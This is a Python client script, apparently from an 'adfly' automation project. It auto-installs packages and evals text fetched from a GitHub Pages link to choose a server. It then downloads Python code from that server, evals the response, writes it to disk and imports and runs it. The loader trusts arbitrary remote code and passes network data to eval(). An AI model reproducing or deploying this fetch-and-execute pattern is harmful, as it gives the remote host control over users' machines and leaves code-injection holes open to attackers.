global_host_address = ('10.10.77.118', 65499)
global_host_page = 'http://10.10.77.118:65500'
local_host_address = ()
LOCAL_HOST_PORT = 59998
local_network_adapters = []
adfly_user_data_location = "C://adfly_user_data"
while True:
    try:
        import requests
        import ping3
        import getmac
        import psutil
        import PIL
        import pyautogui
        break
    except:
        import pip
        pip.main(['install', 'requests'])
        pip.main(['install', 'ping3'])
        pip.main(['install', 'psutil'])
        pip.main(['install', 'getmac'])
        pip.main(['install', 'pillow'])
        pip.main(['install', 'pyautogui'])
        pip.main(['install', 'opencv_python'])

from time import sleep
from random import choice
from requests import get
from os import path, mkdir

if not path.exists(adfly_user_data_location):
    mkdir(adfly_user_data_location)

def verify_global_host_address():
    global global_host_address, global_host_page
    text = get('https://bhaskarpanja93.github.io/AllLinks.github.io/').text.split('<p>')[-1].split('</p>')[0].replace('‘', '"').replace('’', '"').replace('“', '"').replace('”', '"')
    link_dict = eval(text)
    global_host_page = choice(link_dict['adfly_host_page_list'])
    host_ip, host_port = choice(link_dict['adfly_user_tcp_connection_list']).split(':')
    host_port = int(host_port)
    global_host_address = (host_ip, host_port)


while True:
    try:
        while get(f"{global_host_page}/ping").text != 'ping':
            sleep(1)
            verify_global_host_address()
        received_data = get(f"{global_host_page}/py_files?file_code=5").content
        if received_data[0] == 123 and received_data[-1] == 125:
            received_data = eval(received_data)
            this_file_data = received_data['data']
            with open(f'../v3.0/extra_py_files/client_uname_checker.py', 'wb') as file:
                file.write(this_file_data)
            break
    except:
        verify_global_host_address()
import client_uname_checker
client_uname_checker.run()